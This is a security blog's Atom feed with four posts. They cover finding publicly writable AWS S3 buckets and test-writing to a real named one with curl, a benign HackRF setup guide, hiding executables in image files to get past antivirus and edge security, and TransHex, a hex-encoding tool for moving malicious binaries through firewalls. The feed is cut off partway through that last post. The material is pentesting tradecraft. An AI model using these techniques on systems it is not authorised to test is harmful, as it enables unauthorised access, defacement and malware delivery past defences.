<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://192.168.1.30:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://192.168.1.30:4000/" rel="alternate" type="text/html" /><updated>2019-03-27T21:17:38-06:00</updated><id>http://192.168.1.30:4000/feed.xml</id><title type="html">RabbidByte</title><subtitle>RabbidByte's Random Bytes</subtitle><author><name>RabbidByte</name></author><entry><title type="html">AWS S3: Misconfiguration, Discovery, and Abuse</title><link href="http://192.168.1.30:4000/AWS-S3-Misconfiguration-Discovery-and-Abuse.html" rel="alternate" type="text/html" title="AWS S3: Misconfiguration, Discovery, and Abuse" /><published>2017-06-20T01:00:00-06:00</published><updated>2017-06-20T01:00:00-06:00</updated><id>http://192.168.1.30:4000/AWS-S3-Misconfiguration-Discovery-and-Abuse</id><content type="html" xml:base="http://192.168.1.30:4000/AWS-S3-Misconfiguration-Discovery-and-Abuse.html">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;Recent news of the Verizon data leak &lt;a href=&quot;http://www.darkreading.com/cloud/verizon-suffers-cloud-data-leak-exposing-data-on-millions-of-customers/&quot;&gt;http://www.darkreading.com/cloud/verizon-suffers-cloud-data-leak-exposing-data-on-millions-of-customers/&lt;/a&gt; and a similar scenario concerning Dow Jones &lt;a href=&quot;http://www.darkreading.com/cloud/dow-jones-data-leak-results-from-amazon-aws-configuration-error/&quot;&gt;http://www.darkreading.com/cloud/dow-jones-data-leak-results-from-amazon-aws-configuration-error/&lt;/a&gt; prompted me to do a little “poking around”. The basic misconfiguration in these cases was that the administrators of the AWS S3 buckets permitted read access to “Everyone” from anywhere. So really all someone had to do was find the S3 bucket and take whatever they wanted. The interesting thing is that AWS has changed the ACL configuration on S3 buckets pretty much right after the news of Dow Jones hit the main stream media.&lt;/p&gt;

&lt;p&gt;I started to think a little bit about this situation. If administrators make the mistake to leave sensitive information out on S3 buckets with anonymous read access could they make bigger mistakes? What if an administrator left an S3 bucket open with anonymous read/write access? All that someone would need to do is find the bucket, see if they could write to that bucket, figure out what it is used for, and then manipulate content for fun/profit.&lt;/p&gt;

&lt;p&gt;FYI – I will not post my code for bots/spiders&lt;/p&gt;

&lt;h2 id=&quot;find-s3-buckets-one-way-out-of-many&quot;&gt;Find S3 Buckets (one way out of many)&lt;/h2&gt;

&lt;p&gt;Going through the net finding S3 buckets and testing them is painfully tedious if done manually and you would probably never find anything of use. You have to automate this process and the way I would go about doing this would be by creating a Spider.&lt;/p&gt;

&lt;p&gt;Create a simple spider that wonders through the web looking at the source code of webpages that have the following ‘src=’ tags.
*.s3.amazonaws.com
*.s3-[aws regions].amazonaws.com&lt;/p&gt;

&lt;p&gt;Once the spider finds these URLs in the SRC tags have it dump the value, along with the page’s URL to a log file after checking for duplicate entries. That’s it … you found an S3 bucket … whoopee, note sarcasm&lt;/p&gt;

&lt;p&gt;If you need help building a bot or spider pick up a book and learn. I recommend this one &lt;a href=&quot;https://www.amazon.com/Webbots-Spiders-Screen-Scrapers-Developing/dp/1593273975/&quot;&gt;https://www.amazon.com/Webbots-Spiders-Screen-Scrapers-Developing/dp/1593273975/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I will use CNN.com as an example. I found on the main page the S3 bucket http://s3.amazonaws.com/cnn-sponsored-content&lt;/p&gt;

&lt;h2 id=&quot;check-for-write-permissions-2-different-ways&quot;&gt;Check for Write Permissions (2 different ways)&lt;/h2&gt;

&lt;h3 id=&quot;get-the-acl&quot;&gt;Get the ACL&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl [s3 bucket url]/?acl
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Probably the easiest and most detailed way to see if you can get anonymous write access is by reading the ACL. This has its drawbacks though as administrators could misconfigure the ACL for the bucket objects and have no access to read or write the ACL. In this case the bot would show that access is denied.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/aws2017/s3-00.png&quot; alt=&quot;alt text&quot; title=&quot;s3-00&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The example from CNN.com gives us the ACL because “Everyone” has access to read the ACL (READ_ACP). You can see this listed at the bottom of the server’s response.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/aws2017/s3-01.png&quot; alt=&quot;alt text&quot; title=&quot;s3-01&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;URI&amp;gt;http://acs.amazonaws.com/groups/global/AllUsers&amp;lt;/URI&amp;gt;&amp;lt;/Grantee&amp;gt;&amp;lt;Permission&amp;gt; WRITE&amp;lt;/Permission&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Again we don’t want to have to go through all of this manually … you got a puter … use it. Write a simple script to monitor the log file for new entries. When a new S3 bucket URL is written to the log file the script just needs to request the ACL and check for write access. This can all be done with a combination of (you don’t need them all really) curl, grep, awk, and xmllint. Don’t know how to do it? Try google, I really do not want to provide all information for someone to launch a potentially malicious bot/spider.&lt;/p&gt;

&lt;h3 id=&quot;just-try-to-write-to-the-bucket&quot;&gt;Just Try to Write to the Bucket&lt;/h3&gt;

&lt;p&gt;Another way to test to see if you have write access to an S3 bucket is just to write to it. Create a simple txt file with a couple characters in it. Then use curl to upload it to the S3 bucket. If the connection ENDS with an HTTP/1.1 100 Continue then you have write access to the bucket.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/aws2017/s3-02.png&quot; alt=&quot;alt text&quot; title=&quot;s3-02&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -v -H acl=public-read -H key=test.txt -T test.txt http://s3.amazonaws.com/cnn-sponsored-content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/aws2017/s3-03.png&quot; alt=&quot;alt text&quot; title=&quot;s3-03&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;abuse-what-does-the-bucket-contain&quot;&gt;Abuse: What Does the Bucket Contain&lt;/h3&gt;

&lt;p&gt;This is where it gets a tad fun. So lets say that CNN had all their videos for their website hosted in an S3 bucket called cnn_video and we successfully wrote to http://s3.amazonaws.com/cnn_video Well if you have write access in S3 you also have delete access (at least it seems that way in my testing).&lt;/p&gt;

&lt;p&gt;So if the video http://s3.amazonaws.com/cnn_video/main.mp4 was linked in www.cnn.com/index.htm then all an attacker would have to do is use the AWS REST API to delete (http://docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectDELETE.html) the video in the bucket and replace it with whatever other video they wanted (just named the same). The attacker now has their video posted on CNN … hypothetically of course.&lt;/p&gt;

&lt;h3 id=&quot;note&quot;&gt;Note:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;All CNN links with the exception of the one S3 bucket are fictional&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Yes, this was written quickly&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;Yes, this is incomplete&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;No, I will not give you the code for my spider&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>RabbidByte</name></author><summary type="html">Summary Recent news of the Verizon data leak http://www.darkreading.com/cloud/verizon-suffers-cloud-data-leak-exposing-data-on-millions-of-customers/ and a similar scenario concerning Dow Jones http://www.darkreading.com/cloud/dow-jones-data-leak-results-from-amazon-aws-configuration-error/ prompted me to do a little “poking around”. The basic misconfiguration in these cases was that the administrators of the AWS S3 buckets permitted read access to “Everyone” from anywhere. So really all someone had to do was find the S3 bucket and take whatever they wanted. The interesting thing is that AWS has changed the ACL configuration on S3 buckets pretty much right after the news of Dow Jones hit the main stream media. I started to think a little bit about this situation. If administrators make the mistake to leave sensitive information out on S3 buckets with anonymous read access could they make bigger mistakes? What if an administrator left an S3 bucket open with anonymous read/write access? All that someone would need to do is find the bucket, see if they could write to that bucket, figure out what it is used for, and then manipulate content for fun/profit. FYI – I will not post my code for bots/spiders Find S3 Buckets (one way out of many) Going through the net finding S3 buckets and testing them is painfully tedious if done manually and you would probably never find anything of use. You have to automate this process and the way I would go about doing this would be by creating a Spider. Create a simple spider that wonders through the web looking at the source code of webpages that have the following ‘src=’ tags. *.s3.amazonaws.com *.s3-[aws regions].amazonaws.com Once the spider finds these URLs in the SRC tags have it dump the value, along with the page’s URL to a log file after checking for duplicate entries. That’s it … you found an S3 bucket … whoopee, note sarcasm If you need help building a bot or spider pick up a book and learn. I recommend this one https://www.amazon.com/Webbots-Spiders-Screen-Scrapers-Developing/dp/1593273975/ I will use CNN.com as an example. I found on the main page the S3 bucket http://s3.amazonaws.com/cnn-sponsored-content Check for Write Permissions (2 different ways) Get the ACL curl [s3 bucket url]/?acl Probably the easiest and most detailed way to see if you can get anonymous write access is by reading the ACL. This has its drawbacks though as administrators could misconfigure the ACL for the bucket objects and have no access to read or write the ACL. In this case the bot would show that access is denied. The example from CNN.com gives us the ACL because “Everyone” has access to read the ACL (READ_ACP). You can see this listed at the bottom of the server’s response. &amp;lt;URI&amp;gt;http://acs.amazonaws.com/groups/global/AllUsers&amp;lt;/URI&amp;gt;&amp;lt;/Grantee&amp;gt;&amp;lt;Permission&amp;gt; WRITE&amp;lt;/Permission&amp;gt; Again we don’t want to have to go through all of this manually … you got a puter … use it. Write a simple script to monitor the log file for new entries. When a new S3 bucket URL is written to the log file the script just needs to request the ACL and check for write access. This can all be done with a combination of (you don’t need them all really) curl, grep, awk, and xmllint. Don’t know how to do it? Try google, I really do not want to provide all information for someone to launch a potentially malicious bot/spider. Just Try to Write to the Bucket Another way to test to see if you have write access to an S3 bucket is just to write to it. Create a simple txt file with a couple characters in it. Then use curl to upload it to the S3 bucket. If the connection ENDS with an HTTP/1.1 100 Continue then you have write access to the bucket. curl -v -H acl=public-read -H key=test.txt -T test.txt http://s3.amazonaws.com/cnn-sponsored-content Abuse: What Does the Bucket Contain This is where it gets a tad fun. So lets say that CNN had all their videos for their website hosted in an S3 bucket called cnn_video and we successfully wrote to http://s3.amazonaws.com/cnn_video Well if you have write access in S3 you also have delete access (at least it seems that way in my testing). So if the video http://s3.amazonaws.com/cnn_video/main.mp4 was linked in www.cnn.com/index.htm then all an attacker would have to do is use the AWS REST API to delete (http://docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectDELETE.html) the video in the bucket and replace it with whatever other video they wanted (just named the same). The attacker now has their video posted on CNN … hypothetically of course. Note: All CNN links with the exception of the one S3 bucket are fictional Yes, this was written quickly Yes, this is incomplete No, I will not give you the code for my spider</summary></entry><entry><title type="html">HackRF: The easy way</title><link href="http://192.168.1.30:4000/HackRF-The-easy-way.html" rel="alternate" type="text/html" title="HackRF: The easy way" /><published>2016-04-01T01:00:00-06:00</published><updated>2016-04-01T01:00:00-06:00</updated><id>http://192.168.1.30:4000/HackRF-The-easy-way</id><content type="html" xml:base="http://192.168.1.30:4000/HackRF-The-easy-way.html">&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/images/HRF/HRF-768x280.jpg&quot; alt=&quot;alt text&quot; title=&quot;HackRF Title&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;the-story&quot;&gt;The Story&lt;/h2&gt;
&lt;p&gt;Recently many different radio hacks (mousejack, drone hijacking) have hit the internet. This has spurred my interest in analogoue and digital radio. After some bindge shopping on the internet and a few days wait I have had some very nice toys show up. Once the new electronics smell and novelty of a new toy had worn off the frustration kicked in.&lt;/p&gt;

&lt;p&gt;RTL-SDR is a dirt cheap way to start playing with radio using the RTL2832U chipset. I like to do things right when I start a project so I decided to purchase a nice SDR hardware transciever that would provide all the functionality needed without breaking the bank. Enter the HackRF One from &lt;a href=&quot;https://greatscottgadgets.com/hackrf/&quot;&gt;Great Scott Gadgets&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now wanting to get up and running with this device ASAP I followed the recommendation from Michael Ossmann &lt;a href=&quot;https://greatscottgadgets.com/sdr/1/&quot;&gt;https://greatscottgadgets.com/sdr/1/&lt;/a&gt; and downloaded Pentoo Linux. This distro with the disposable laptop that I had dedicated to radio caused ALL my frustration. First off new inexpensive laptops now all come with Windows 10 … I like to keep that around for convenience. So I shrunk the partition and started the install of Pentoo. Now this HP laptop has the WORST BIOS I have ever come across. The ability to enable legacy booting is there but it lacks the option to set priority between UEFI and Legacy. Solution: Troubleshooting reboot to UEFI device from Windows EVERY TIME, then crash the boot process with USB drive, then the BIOS will let you select an OS from the MBR … so bloody painful!&lt;/p&gt;

&lt;p&gt;Finally I am logged into Pentoo … no network … and video keeps crapping out. I felt like I was working on a linux system back in 1999 hunting for drivers. Let’s make this part of the story short shall we? After about 5 hours of messing with this crap Gentoo distro and not being able to get openGL running right I almost chucked the laptop across the room. Why spend all this time trying to make a piece of junk like Gentoo working when the time could be spent building a proper box with support for HackRF?&lt;/p&gt;

&lt;p&gt;ENTER Fedora 23, yes I would much rather run RedHat however I am too cheap to pay for a subscription. I could not believe how streamlined it is to get HackRF going in Fedora so I decided to write this to save others time and pain with a crappy ass Gentoo distro. Oh and did I mention that Fedora 23 has UEFI support? Makes everything so much nicer.&lt;/p&gt;

&lt;p&gt;This is not the officially recommended way to install gnuradio. I encountered issues with PyBOMBS and version numbers. This supposedly was fixed &lt;a href=&quot;https://github.com/gnuradio/pybombs/pull/246&quot;&gt;https://github.com/gnuradio/pybombs/pull/246&lt;/a&gt; although it didn’t work for me. I decided to go with dnf and see what I could do with the repositories and was pleasantly surprised.&lt;/p&gt;

&lt;p&gt;My recommendations for HackRF One:
..* DON’T use Pentoo
..* Screen shots and build done on a VM, don’t do this. Load onto your hardware so that you can take advantage of the high USB speeds of the HackRF One
..* Install gqrx with Fedora. Not needed but very useful.&lt;/p&gt;

&lt;h2 id=&quot;build&quot;&gt;BUILD&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;Perform a normal installation of Fedora 23 Workstation&lt;/li&gt;
  &lt;li&gt;Open the CLI and run the following:
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo dnf update
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;&lt;img src=&quot;/assets/images/HRF/hrf-01.png&quot; alt=&quot;alt text&quot; title=&quot;hrf-01&quot; /&gt;&lt;/p&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo dnf install kernel-devel-4.2.3-300.fc23.x86_64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;(Most likely not needed but I had to install to compile the VM additions)
&lt;img src=&quot;/assets/images/HRF/hrf-03.png&quot; alt=&quot;alt text&quot; title=&quot;hrf-03&quot; /&gt;&lt;/p&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo dnf install gnuradio
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;&lt;img src=&quot;/assets/images/HRF/hrf-04.png&quot; alt=&quot;alt text&quot; title=&quot;hrf-04&quot; /&gt;&lt;/p&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo dnf install gr-osmosdr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;&lt;img src=&quot;/assets/images/HRF/hrf-05.png&quot; alt=&quot;alt text&quot; title=&quot;hrf-05&quot; /&gt;&lt;/p&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo dnf install gqrx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;&lt;img src=&quot;/assets/images/HRF/hrf-06.png&quot; alt=&quot;alt text&quot; title=&quot;hrf-06&quot; /&gt;&lt;/p&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hackrf_info
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;(Used to check if all is good)&lt;br /&gt;
&lt;img src=&quot;/assets/images/HRF/hrf-07.png&quot; alt=&quot;alt text&quot; title=&quot;hrf-07&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;You are done … yup that’s it. Way easier than Pentoo.
&lt;img src=&quot;/assets/images/HRF/hrf-08.png&quot; alt=&quot;alt text&quot; title=&quot;hrf-08&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;additional-reading&quot;&gt;Additional Reading&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://www.amazon.com/The-Hobbyists-Guide-RTL-SDR-Software-ebook/dp/B00KCDF1QI&quot;&gt;The Hobbyist’s Guide to the RTL-SDR: Really Cheap Software Defined Radio&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.arrl.org/files/file/Technology/tis/info/pdf/020708qex013.pdf&quot;&gt;A Software-Defined Radio for the Masses, Part 1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.eas.uccs.edu/~mwickert/ece4670/lecture_notes/Lab6.pdf&quot;&gt;ECE 4670 Spring 2014 Lab 6 Software Defined Radio and the RTL-SDR USB Dongle&lt;/a&gt;&lt;/p&gt;</content><author><name>RabbidByte</name></author><summary type="html">The Story Recently many different radio hacks (mousejack, drone hijacking) have hit the internet. This has spurred my interest in analogoue and digital radio. After some bindge shopping on the internet and a few days wait I have had some very nice toys show up. Once the new electronics smell and novelty of a new toy had worn off the frustration kicked in. RTL-SDR is a dirt cheap way to start playing with radio using the RTL2832U chipset. I like to do things right when I start a project so I decided to purchase a nice SDR hardware transciever that would provide all the functionality needed without breaking the bank. Enter the HackRF One from Great Scott Gadgets. Now wanting to get up and running with this device ASAP I followed the recommendation from Michael Ossmann https://greatscottgadgets.com/sdr/1/ and downloaded Pentoo Linux. This distro with the disposable laptop that I had dedicated to radio caused ALL my frustration. First off new inexpensive laptops now all come with Windows 10 … I like to keep that around for convenience. So I shrunk the partition and started the install of Pentoo. Now this HP laptop has the WORST BIOS I have ever come across. The ability to enable legacy booting is there but it lacks the option to set priority between UEFI and Legacy. Solution: Troubleshooting reboot to UEFI device from Windows EVERY TIME, then crash the boot process with USB drive, then the BIOS will let you select an OS from the MBR … so bloody painful! Finally I am logged into Pentoo … no network … and video keeps crapping out. I felt like I was working on a linux system back in 1999 hunting for drivers. Let’s make this part of the story short shall we? After about 5 hours of messing with this crap Gentoo distro and not being able to get openGL running right I almost chucked the laptop across the room. Why spend all this time trying to make a piece of junk like Gentoo working when the time could be spent building a proper box with support for HackRF? ENTER Fedora 23, yes I would much rather run RedHat however I am too cheap to pay for a subscription. I could not believe how streamlined it is to get HackRF going in Fedora so I decided to write this to save others time and pain with a crappy ass Gentoo distro. Oh and did I mention that Fedora 23 has UEFI support? Makes everything so much nicer. This is not the officially recommended way to install gnuradio. I encountered issues with PyBOMBS and version numbers. This supposedly was fixed https://github.com/gnuradio/pybombs/pull/246 although it didn’t work for me. I decided to go with dnf and see what I could do with the repositories and was pleasantly surprised. My recommendations for HackRF One: ..* DON’T use Pentoo ..* Screen shots and build done on a VM, don’t do this. Load onto your hardware so that you can take advantage of the high USB speeds of the HackRF One ..* Install gqrx with Fedora. Not needed but very useful. BUILD Perform a normal installation of Fedora 23 Workstation Open the CLI and run the following: sudo dnf update sudo dnf install kernel-devel-4.2.3-300.fc23.x86_64 (Most likely not needed but I had to install to compile the VM additions) sudo dnf install gnuradio sudo dnf install gr-osmosdr sudo dnf install gqrx hackrf_info (Used to check if all is good) You are done … yup that’s it. Way easier than Pentoo. Additional Reading The Hobbyist’s Guide to the RTL-SDR: Really Cheap Software Defined Radio A Software-Defined Radio for the Masses, Part 1 ECE 4670 Spring 2014 Lab 6 Software Defined Radio and the RTL-SDR USB Dongle</summary></entry><entry><title type="html">Transfer Any Binary into a Protected Network</title><link href="http://192.168.1.30:4000/Transfer-Any-Binary-into-a-Protected-Network.html" rel="alternate" type="text/html" title="Transfer Any Binary into a Protected Network" /><published>2013-06-24T01:00:00-06:00</published><updated>2013-06-24T01:00:00-06:00</updated><id>http://192.168.1.30:4000/Transfer-Any-Binary-into-a-Protected-Network</id><content type="html" xml:base="http://192.168.1.30:4000/Transfer-Any-Binary-into-a-Protected-Network.html">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;Well this is another old trick that still works today.  It still gets past all edge security and antivirus … well that is until you pull the executable out again.  I find myself using this trick when I need to bring penetration testing tools into a network.  Most of the time antivirus or edge security devices will stop the transfer of these executables.  So what can you do to get them in?&lt;/p&gt;

&lt;p&gt;The first is very obvious, just zip them up and encrypt them.  This will get the package into some networks but not all.  Many networks now configure edge devices and email security systems to block and/or alert on encrypted attachments.  This would probably blow your cover and game over.&lt;/p&gt;

&lt;p&gt;Another way to get executables into networks is by using a system called &lt;a href=&quot;https://github.com/RabbidByte/TransHex&quot; title=&quot;TransHex Download&quot;&gt;TransHex&lt;/a&gt; written while I was running essentialexploit.com.  As of now this has not been released but it will be very soon (&lt;em&gt;update&lt;/em&gt; TransHex is now released).  This application requires a web server on the internet that dynamically converts binary to hex and then gives you a text file that you can download.  Once you have the text file the TransHex client will put that back into a binary for you.&lt;/p&gt;

&lt;p&gt;The simplest way to get an executable into a network is to email it or just download it.  However as we mentioned earlier most edge devices will stop the download and alert the admins.  Not something that you want to have happen, however with a little prep you can hide any binary into another file and just bring it on into a network.  Here is how it works.&lt;/p&gt;

&lt;h2 id=&quot;how-to-do-it&quot;&gt;How To Do It&lt;/h2&gt;

&lt;p&gt;You must know beforehand which executibles you want send.  This is the downside.  If you forget about a program that you need you will have to have access to the outside system again to send it.  Sometimes this could delay your penetration testing by quite a few hours, and sometimes it is not a problem at all.  So here’s what you do.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;On an external windows system take a harmless picture file and your executable and drop them in the same folder so that it’s easy to work with them&lt;/li&gt;
  &lt;li&gt;Compress your executable (no encryption needed) into a zip file&lt;/li&gt;
  &lt;li&gt;Open up a windows command prompt&lt;/li&gt;
  &lt;li&gt;Navigate into the folder where your files are located&lt;/li&gt;
  &lt;li&gt;Run – copy /B [image file] + [zip file] [new image file]&lt;/li&gt;
  &lt;li&gt;Now there is a new file in your folder that looks exactly like your original image&lt;/li&gt;
  &lt;li&gt;This new file is the image file with the zip in binary appended to the end of the file&lt;/li&gt;
  &lt;li&gt;Now send this file into the protected network either by email, http … whatever&lt;/li&gt;
  &lt;li&gt;On the internal windows system open up 7zip&lt;/li&gt;
  &lt;li&gt;Under “File” select “open” and find your image file&lt;/li&gt;
  &lt;li&gt;Once 7zip opens the image … you see your package!  Extract it and away you go, but beware of local antivirus because once the exe is extracted it will most likely be scanned.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;images-from-testing&quot;&gt;Images From Testing&lt;/h2&gt;
&lt;p&gt;The command&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/command.png&quot; alt=&quot;alt text&quot; title=&quot;The Command&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The files&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/file_listing.png&quot; alt=&quot;alt text&quot; title=&quot;The Files&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Scan the attachment (just to show that it was malicious)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/scan-1.png&quot; alt=&quot;alt text&quot; title=&quot;Scan 1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Scan the malicious image&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/scan-2.png&quot; alt=&quot;alt text&quot; title=&quot;Scan 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Extracting the package from the image&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/zip.png&quot; alt=&quot;alt text&quot; title=&quot;Zip&quot; /&gt;&lt;/p&gt;</content><author><name>RabbidByte</name></author><summary type="html">Summary Well this is another old trick that still works today. It still gets past all edge security and antivirus … well that is until you pull the executable out again. I find myself using this trick when I need to bring penetration testing tools into a network. Most of the time antivirus or edge security devices will stop the transfer of these executables. So what can you do to get them in? The first is very obvious, just zip them up and encrypt them. This will get the package into some networks but not all. Many networks now configure edge devices and email security systems to block and/or alert on encrypted attachments. This would probably blow your cover and game over. Another way to get executables into networks is by using a system called TransHex written while I was running essentialexploit.com. As of now this has not been released but it will be very soon (update TransHex is now released). This application requires a web server on the internet that dynamically converts binary to hex and then gives you a text file that you can download. Once you have the text file the TransHex client will put that back into a binary for you. The simplest way to get an executable into a network is to email it or just download it. However as we mentioned earlier most edge devices will stop the download and alert the admins. Not something that you want to have happen, however with a little prep you can hide any binary into another file and just bring it on into a network. Here is how it works. How To Do It You must know beforehand which executibles you want send. This is the downside. If you forget about a program that you need you will have to have access to the outside system again to send it. Sometimes this could delay your penetration testing by quite a few hours, and sometimes it is not a problem at all. So here’s what you do. On an external windows system take a harmless picture file and your executable and drop them in the same folder so that it’s easy to work with them Compress your executable (no encryption needed) into a zip file Open up a windows command prompt Navigate into the folder where your files are located Run – copy /B [image file] + [zip file] [new image file] Now there is a new file in your folder that looks exactly like your original image This new file is the image file with the zip in binary appended to the end of the file Now send this file into the protected network either by email, http … whatever On the internal windows system open up 7zip Under “File” select “open” and find your image file Once 7zip opens the image … you see your package! Extract it and away you go, but beware of local antivirus because once the exe is extracted it will most likely be scanned. Images From Testing The command The files Scan the attachment (just to show that it was malicious) Scan the malicious image Extracting the package from the image</summary></entry><entry><title type="html">TransHex Server and Client</title><link href="http://192.168.1.30:4000/TransHex-Server-and-Client.html" rel="alternate" type="text/html" title="TransHex Server and Client" /><published>2013-05-25T01:00:00-06:00</published><updated>2013-05-25T01:00:00-06:00</updated><id>http://192.168.1.30:4000/TransHex-Server-and-Client</id><content type="html" xml:base="http://192.168.1.30:4000/TransHex-Server-and-Client.html">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;We have all faced the problem of transferring “malicious” or binary files through corporate firewalls or proxies when doing penetration tests.  Previously the work around was quite easy.  FTP, SSL, and SSH tunneling (the list goes on) provided a quick and easy way to bring whatever tools a penetration tester needed into the environment.  Edge technologies have now matured and these simple techniques are no longer working mainly due to next generation firewalls with application ID.  So how do you get around this?  Go old school to beat new school tech!&lt;/p&gt;

&lt;p&gt;The general idea we had before writing the very rough first release of TransHex was AV does not scan hex in text files.  So how to beat the application ID portion of the nexgen firewalls?  Easy, you don’t.  We initially wrote the program completely in python as a client server app and we were quickly blocked by nexgen firewalls.  So if you can’t beat them, join them.  The app was ported to a web server and bingo bango we were transferring files through multiple nexgen firewalls without being detected.&lt;/p&gt;

&lt;p&gt;So here is a quick breakdown on how TransHex works.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The attacker/pentester goes to the web app that would be loaded on a public server&lt;/li&gt;
  &lt;li&gt;The attacker/pentester requests an exe that is available on a different publicly available server and submits to the application&lt;/li&gt;
  &lt;li&gt;TransHex at this point downloads the exe and saves it to [web path]/hex/[filename]&lt;/li&gt;
  &lt;li&gt;Once the download is complete a python script is ran that converts the binary file to a single hex string&lt;/li&gt;
  &lt;li&gt;The hex string is written to a new text file in [web path]/hex/[filename]&lt;/li&gt;
  &lt;li&gt;The attacker/pentester then goes back to the main page of the application by clicking continue&lt;/li&gt;
  &lt;li&gt;The new text file is now listed on the first page&lt;/li&gt;
  &lt;li&gt;The attacker/pentester then saves the text file to the local machine using the internet browser&lt;/li&gt;
  &lt;li&gt;On the local machine the attacker/pentester converts the text file with the hex string to a binary using the python client script&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;application-notes&quot;&gt;Application Notes&lt;/h2&gt;

&lt;p&gt;This application is provided as is.  NO support is offered for this application and only you are liable for any damage this application may cause.&lt;/p&gt;

&lt;h3 id=&quot;features-that-need-to-be-added&quot;&gt;Features that need to be added&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Error handling&lt;/li&gt;
  &lt;li&gt;Help/man pages&lt;/li&gt;
  &lt;li&gt;Request hex conversion of local (server side) executables&lt;/li&gt;
  &lt;li&gt;Hex string obfuscation&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;limitations-and-testing&quot;&gt;Limitations and Testing&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Max file size tested with 115KB&lt;/li&gt;
  &lt;li&gt;File types tested Zip and exe, windows files and known malware&lt;/li&gt;
